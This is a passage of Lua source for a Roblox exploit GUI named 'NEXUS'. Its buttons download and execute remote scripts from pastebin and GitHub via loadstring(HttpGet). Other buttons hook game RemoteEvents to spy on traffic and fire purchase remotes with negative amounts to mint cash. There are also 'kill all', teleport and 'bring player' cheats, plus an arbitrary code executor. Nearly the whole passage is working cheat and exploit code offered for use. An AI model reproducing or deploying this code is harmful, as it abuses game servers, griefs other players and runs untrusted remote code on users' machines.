addButton(scriptPanel, "CLIENT SPAWNER", function() loadstring(game:HttpGet("https://pastebin.com/raw/8f5yA0An",true))() end)
addButton(scriptPanel, "ADMIN TROLL", function() loadstring(game:HttpGet("https://pastebin.com/raw/VjzUsTdB",true))() end)
addButton(scriptPanel, "CHAT TROLL", function() loadstring(game:HttpGet("https://github.com/Synergy-Networks/products/raw/main/BetterBypasser/loader.lua"))() end)
addButton(scriptPanel, "REMOTE SPY", function()
	local spyGui = Instance.new("ScreenGui", playerGui)
	local frame = Instance.new("Frame", spyGui)
	frame.Size = UDim2.new(0,500,0,400)
	frame.Position = UDim2.new(0.5,-250,0.5,-200)
	frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
	local scroll = Instance.new("ScrollingFrame", frame)
	scroll.Size = UDim2.new(1,-10,1,-40)
	scroll.Position = UDim2.new(0,5,0,35)
	scroll.BackgroundTransparency = 1
	local layout = Instance.new("UIListLayout", scroll)
	local oldFire = {}
	local function hookRemote(remote)
		if remote:IsA("RemoteEvent") then
			oldFire[remote] = remote.FireServer
			remote.FireServer = function(self, ...)
				local args = {...}
				local log = Instance.new("TextLabel", scroll)
				log.Size = UDim2.new(1,-10,0,20)
				log.Text = remote.Name .. ": " .. table.concat(args, ", ")
				log.TextColor3 = Color3.new(255,255,255)
				log.BackgroundTransparency = 1
				return oldFire[remote](self, ...)
			end
		end
	end
	for _, r in pairs(game.ReplicatedStorage:GetDescendants()) do
		if r:IsA("RemoteEvent") then pcall(hookRemote, r) end
	end
end)

-- ============ CASH MENU BUTTONS ============
local cashPanel = allTabPanels["CASH"]
addButton(cashPanel, "GIVE CASH (ANTIEXPLOIT)", function()
	local remote = game.ReplicatedStorage:FindFirstChild("AntiExploit")
	if remote then remote:FireServer("ItemName", -100000) end
end)
addButton(cashPanel, "GIVE CASH (BUYEVENT)", function()
	local remote = game.ReplicatedStorage:FindFirstChild("BuyEvent")
	if remote then remote:FireServer("Silenced Pistol", -100000) end
end)
addButton(cashPanel, "GIVE CASH (GIVEAYUDA)", function()
	local remote = game.ReplicatedStorage:FindFirstChild("GiveAyuda")
	if remote then remote:FireServer("Combat Pistol", -1) end
end)

-- ============ PLAYER MENU BUTTONS ============
local playerMenuPanel = allTabPanels["PLAYER"]
addButton(playerMenuPanel, "PLAYER SCANNER", function()
	local scannerGui = Instance.new("ScreenGui", playerGui)
	local frame = Instance.new("Frame", scannerGui)
	frame.Size = UDim2.new(0,350,0,400)
	frame.Position = UDim2.new(0.5,-175,0.5,-200)
	frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0,8)
	local scroll = Instance.new("ScrollingFrame", frame)
	scroll.Size = UDim2.new(0.9,0,0,280)
	scroll.Position = UDim2.new(0.05,0,0,90)
	scroll.BackgroundTransparency = 1
	local layout = Instance.new("UIListLayout", scroll)
	local function addPlayer(plr)
		local btn = Instance.new("TextButton", scroll)
		btn.Size = UDim2.new(1,0,0,30)
		btn.Text = plr.Name
		btn.BackgroundColor3 = Color3.fromRGB(30,30,30)
		btn.TextColor3 = Color3.new(255,255,255)
		btn.MouseButton1Click:Connect(function()
			if plr.Character and plr.Character:FindFirstChild("Head") then
				workspace.CurrentCamera.CameraSubject = plr.Character.Head
			end
		end)
	end
	for _, plr in pairs(Players:GetPlayers()) do if plr ~= player then addPlayer(plr) end end
	Players.PlayerAdded:Connect(addPlayer)
end)
addButton(playerMenuPanel, "USERNAME COPIER", function()
	local copierGui = Instance.new("ScreenGui", playerGui)
	local frame = Instance.new("Frame", copierGui)
	frame.Size = UDim2.new(0,300,0,400)
	frame.Position = UDim2.new(0.5,-150,0.5,-200)
	frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
	local scroll = Instance.new("ScrollingFrame", frame)
	scroll.Size = UDim2.new(1,-10,1,-40)
	scroll.Position = UDim2.new(0,5,0,35)
	scroll.BackgroundTransparency = 1
	local layout = Instance.new("UIListLayout", scroll)
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			local btn = Instance.new("TextButton", scroll)
			btn.Size = UDim2.new(1,-10,0,30)
			btn.Text = plr.Name
			btn.BackgroundColor3 = Color3.fromRGB(30,30,30)
			btn.TextColor3 = Color3.new(255,255,255)
			btn.MouseButton1Click:Connect(function()
				if setclipboard then setclipboard(plr.Name) end
			end)
		end
	end
end)

-- ============ NEXUS MENU BUTTONS ============
local nexusPanel = allTabPanels["NEXUS"]
addButton(nexusPanel, "FPS BOOST", function()
	game.Lighting.GlobalShadows = false
	game.Lighting.FogEnd = 100000
	workspace.DescendantAdded:Connect(function(obj)
		if obj:IsA("Part") or obj:IsA("MeshPart") then
			obj.Material = Enum.Material.SmoothPlastic
			obj.Reflectance = 0
		end
	end)
end)
addButton(nexusPanel, "BIG HEAD SLIDER", function()
	local sliderGui = Instance.new("ScreenGui", game.CoreGui)
	local frame = Instance.new("Frame", sliderGui)
	frame.Size = UDim2.new(0,220,0,100)
	frame.Position = UDim2.new(0,50,0,50)
	frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
	local slider = Instance.new("TextButton", frame)
	slider.Size = UDim2.new(0.8,0,0,30)
	slider.Position = UDim2.new(0.1,0,0.5,-15)
	slider.Text = "Size: 6"
	slider.BackgroundColor3 = Color3.fromRGB(30,30,30)
	slider.TextColor3 = Color3.new(255,255,255)
	local size = 6
	local dragging = false
	slider.MouseButton1Down:Connect(function() dragging = true end)
	UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
	UserInputService.InputChanged:Connect(function(i)
		if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
			local percent = math.clamp((i.Position.X - slider.AbsolutePosition.X) / slider.AbsoluteSize.X, 0, 1)
			size = math.floor(1 + percent * 34)
			slider.Text = "Size: " .. size
			_G.HeadSize = size
		end
	end)
end)

-- ============ BILLIONARE MENU BUTTONS ============
local billionarePanel = allTabPanels["BILLIONARE"]
addButton(billionarePanel, "SPAWN CAR", function()
	local remote = game.ReplicatedStorage:FindFirstChild("SpawnCarEvent")
	if remote then remote:FireServer() end
end)
addButton(billionarePanel, "GIVE CASH", function()
	local remote = game.ReplicatedStorage:FindFirstChild("GiveAyuda")
	if remote then remote:FireServer("Combat Pistol", -1) end
end)

-- ============ RP TELEPORT BUTTONS ============
local rpTpPanel = allTabPanels["RP TP"]
local function addTP(name, pos)
	addButton(rpTpPanel, name, function()
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			player.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
		end
	end)
end
addTP("HOSPITAL", Vector3.new(-1277.2, 3.38, -1826.1))
addTP("GARAGE", Vector3.new(-790.07, 3.35, 544.59))
addTP("GUNSHOP", Vector3.new(-428.6, 6.01, -689.6))
addTP("POLICE", Vector3.new(-1821.7, 13.09, 286.42))
addTP("TRAPHOUSE", Vector3.new(-387.3, 44.56, 1706.3))

-- ============ ADMIN PANEL BUTTONS ============
local adminPanel = allTabPanels["ADMIN"]
addButton(adminPanel, "KILL ALL", function()
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player and plr.Character and plr.Character:FindFirstChild("Humanoid") then
			plr.Character.Humanoid.Health = 0
		end
	end
end)

-- ============ REMOTES BUTTONS ============
local remotesPanel = allTabPanels["REMOTES"]
addButton(remotesPanel, "REMOTE SPY (ADVANCED)", function()
	local spyGui = Instance.new("ScreenGui", playerGui)
	local frame = Instance.new("Frame", spyGui)
	frame.Size = UDim2.new(0,600,0,400)
	frame.Position = UDim2.new(0.5,-300,0.5,-200)
	frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
	local scroll = Instance.new("ScrollingFrame", frame)
	scroll.Size = UDim2.new(1,-10,1,-40)
	scroll.Position = UDim2.new(0,5,0,35)
	scroll.BackgroundTransparency = 1
	local layout = Instance.new("UIListLayout", scroll)
	local function log(msg)
		local label = Instance.new("TextLabel", scroll)
		label.Size = UDim2.new(1,-10,0,20)
		label.Text = msg
		label.TextColor3 = Color3.new(255,255,255)
		label.BackgroundTransparency = 1
	end
	local oldFire = {}
	local function hookRemote(remote)
		if remote:IsA("RemoteEvent") then
			oldFire[remote] = remote.FireServer
			remote.FireServer = function(self, ...)
				local args = {...}
				log(remote.Name .. " fired with args: " .. table.concat(args, ", "))
				return oldFire[remote](self, ...)
			end
		elseif remote:IsA("RemoteFunction") then
			oldFire[remote] = remote.InvokeServer
			remote.InvokeServer = function(self, ...)
				local args = {...}
				log(remote.Name .. " invoked with args: " .. table.concat(args, ", "))
				return oldFire[remote](self, ...)
			end
		end
	end
	for _, r in pairs(game.ReplicatedStorage:GetDescendants()) do
		if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then
			pcall(hookRemote, r)
		end
	end
	log("Remote Spy Active - Watching all remotes!")
end)

-- ============ PLAYER LIST TAB ============
local playerListPanel = allTabPanels["PLAYER LIST"]
local function refreshPlayers()
	for _, child in ipairs(playerListPanel:GetChildren()) do if child:IsA("Frame") then child:Destroy() end end
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			local row = new("Frame", {Parent = playerListPanel, Size = UDim2.new(1, -12, 0, 38), BackgroundColor3 = Color3.fromRGB(25,25,25)})
			new("UICorner", {CornerRadius = UDim.new(0,4), Parent = row})
			local nameLabel = new("TextLabel", {Parent = row, Size = UDim2.new(0.5,0,1,0), Position = UDim2.new(0,8,0,0), BackgroundTransparency = 1, Text = plr.Name, TextColor3 = Color3.new(255,255,255), Font = Enum.Font.Gotham, TextSize = 12, TextXAlignment = Enum.TextXAlignment.Left})
			local btnContainer = new("Frame", {Parent = row, Size = UDim2.new(0.5,0,1,0), Position = UDim2.new(0.5,0,0,0), BackgroundTransparency = 1})
			new("UIListLayout", {Parent = btnContainer, FillDirection = Enum.FillDirection.Horizontal, Padding = UDim.new(0,4), HorizontalAlignment = Enum.HorizontalAlignment.Right})
			local function makeBtn(text, callback)
				local b = new("TextButton", {Parent = btnContainer, Size = UDim2.new(0,55,0,26), BackgroundColor3 = Color3.fromRGB(35,35,35), Text = text, TextColor3 = Color3.new(255,255,255), Font = Enum.Font.GothamSemibold, TextSize = 10})
				new("UICorner", {CornerRadius = UDim.new(0,4), Parent = b})
				b.MouseButton1Click:Connect(function() if callback then callback(plr) end end)
			end
			makeBtn("VIEW", function(p) if p.Character then workspace.CurrentCamera.CameraSubject = p.Character end end)
			makeBtn("TP", function(p) if p.Character and p.Character:FindFirstChild("HumanoidRootPart") and player.Character then player.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame end end)
			makeBtn("BRING", function(p) if p.Character and p.Character:FindFirstChild("HumanoidRootPart") and player.Character then p.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame end end)
		end
	end
end
refreshPlayers()
Players.PlayerAdded:Connect(refreshPlayers)
Players.PlayerRemoving:Connect(refreshPlayers)

-- ============ SETTINGS TAB ============
local settingsPanel = allTabPanels["SETTINGS"]
local closeBtn = new("TextButton", {Parent = settingsPanel, Size = UDim2.new(1,0,0,40), BackgroundColor3 = Color3.fromRGB(40,40,40), Text = "CLOSE GUI", TextColor3 = Color3.new(255,255,255), Font = Enum.Font.GothamBold, TextSize = 14})
new("UICorner", {CornerRadius = UDim.new(0,4), Parent = closeBtn})
closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)

-- ============ EXECUTOR TAB ============
local executorPanel = allTabPanels["EXECUTOR"]
local execBtn = new("TextButton", {Parent = executorPanel, Size = UDim2.new(1,0,0,36), Position = UDim2.new(0,0,0,0), BackgroundColor3 = Color3.fromRGB(40,40,40), Text = "EXECUTE", TextColor3 = Color3.new(255,255,255), Font = Enum.Font.GothamBold, TextSize = 14})
new("UICorner", {CornerRadius = UDim.new(0,4), Parent = execBtn})
local codeBox = new("TextBox", {Parent = executorPanel, Size = UDim2.new(1,0,1,-46), Position = UDim2.new(0,0,0,46), BackgroundColor3 = Color3.fromRGB(25,25,25), Text = "-- Enter script here\nprint('NEXUS Executor Ready!')", MultiLine = true, TextColor3 = Color3.new(200,200,200), Font = Enum.Font.Code, TextSize = 12, ClearTextOnFocus = false})
new("UICorner", {CornerRadius = UDim.new(0,4), Parent = codeBox})
execBtn.MouseButton1Click:Connect(function() pcall(function() loadstring(codeBox.Text)() end) end)

-- ============ TOGGLE ============
UserInputService.InputBegan:Connect(function(i, gp)
	if gp then return end
	if i.KeyCode == Enum.KeyCode.RightShift then
		screenGui.Enabled = not screenGui.Enabled
	end
end)

print("COMPLETE NEXUS MENU LOADED - ALL TABS HAVE CONTENT!")